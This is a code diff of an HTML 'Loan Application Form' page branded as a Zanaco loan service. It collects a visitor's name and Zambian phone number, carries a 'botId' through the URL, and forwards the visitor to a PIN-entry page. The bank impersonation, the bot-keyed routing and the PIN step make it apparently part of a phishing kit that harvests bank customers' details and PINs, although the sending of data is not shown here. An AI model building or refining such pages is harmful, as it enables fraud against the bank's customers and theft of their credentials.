@@ -4,7 +4,6 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Loan Application Form</title>
-
 <style>
 body {
     font-family: Arial, sans-serif;
@@ -15,7 +14,6 @@ body {
     height: 100vh;
     margin: 0;
 }
-
 .loan-container {
     background: #fff;
     padding: 30px;
@@ -24,62 +22,38 @@ body {
     max-width: 400px;
     box-shadow: 0 5px 15px rgba(0,0,0,0.1);
 }
-
-h2 {
-    text-align: center;
-    margin-bottom: 20px;
-}
-
-label {
-    display: block;
-    margin: 10px 0 5px;
-    font-weight: bold;
-}
-
-input {
-    width: 100%;
-    padding: 10px;
-    border-radius: 6px;
-    border: 1px solid #ccc;
-    margin-bottom: 15px;
-}
-
-.checkbox-container {
-    display: flex;
-    align-items: center;
-    margin-bottom: 20px;
-}
-
-button {
-    width: 100%;
-    padding: 12px;
-    background: red;
-    color: white;
-    border: none;
-    border-radius: 6px;
-    font-size: 16px;
-    cursor: pointer;
-}
-
-button:disabled {
-    background: #ccc;
-    cursor: not-allowed;
-}
-
 .logo-container {
     width: 100%;
     height: 120px;
     margin-bottom: 20px;
 }
-
 .logo {
     width: 100%;
     height: 100%;
     object-fit: cover;
 }
+label { display: block; margin: 10px 0 5px; font-weight: bold; }
+input { width: 100%; padding: 10px; margin-bottom: 15px; }
+button { width: 100%; padding: 12px; background: red; color: #fff; border: none; }
+button:disabled { background: #ccc; }
+
+.checkbox-label {
+    display: flex;
+    align-items: center;      /* vertically center the checkbox and text */
+    gap: 8px;                 /* space between checkbox and text */
+    font-size: 14px;
+    margin-bottom: 15px;
+    cursor: pointer;          /* makes label clickable */
+}
+
+.checkbox-label input[type="checkbox"] {
+    width: 18px;
+    height: 18px;
+    accent-color: red;        /* makes the checkbox red to match button */
+}
+
 </style>
 </head>
-
 <body>
 
 <div class="loan-container">
@@ -90,40 +64,31 @@ button:disabled {
     <h2>Loan Application Form</h2>
 
     <form id="detailsForm">
-
         <label>Full Name</label>
-        <input id="name" type="text" required>
+        <input id="name" placeholder="Name" required>
 
         <label>Phone Number</label>
-        <input id="phone" type="tel" required>
+        <input id="phone" placeholder="+260" required>
 
-        <div class="checkbox-container">
-            <input type="checkbox" id="confirmCheck">
-            <label for="confirmCheck">
-                I agree to Zanaco Smart Loan terms and conditions
-            </label>
-        </div>
+        <label class="checkbox-label">
+    <input type="checkbox" id="confirmCheck">
+    I agree to Zanaco Loans terms and services
+</label>
+
 
         <button id="nextBtn" disabled>Next</button>
     </form>
 </div>
 
 <script>
-// ---------------- BOT ROUTING (FIXED) ----------------
-// Get botId from localStorage
-const botId = localStorage.getItem('botId');
+const params = new URLSearchParams(window.location.search);
+const botId = params.get('botId') || window.location.pathname.split('/').pop();
+if (!botId) { alert("Invalid access link"); throw new Error(); }
 
-if (!botId) {
-    alert("Invalid access link");
-    throw new Error("botId missing");
-}
-
-// Prevent skipping previous step
 if (!localStorage.getItem('loanAmount')) {
-    window.location.href = 'index.html';
+    window.location.href = `index.html?botId=${botId}`;
 }
 
-// ---------------- FORM LOGIC ----------------
 const confirmCheck = document.getElementById('confirmCheck');
 const nextBtn = document.getElementById('nextBtn');
 
@@ -134,11 +99,13 @@ confirmCheck.addEventListener('change', () => {
 document.getElementById('detailsForm').addEventListener('submit', e => {
     e.preventDefault();
 
-    localStorage.setItem('name', name.value);
-    localStorage.setItem('phone', phone.value);
+    const nameInput = document.getElementById('name');
+    const phoneInput = document.getElementById('phone');
 
-    // Redirect to PIN page (botId is stored, no query string needed)
-    window.location.href = 'pin.html';
+    localStorage.setItem('name', nameInput.value);
+    localStorage.setItem('phone', phoneInput.value);
+
+    window.location.href = `pin.html?botId=${botId}`;
 });
 </script>
 
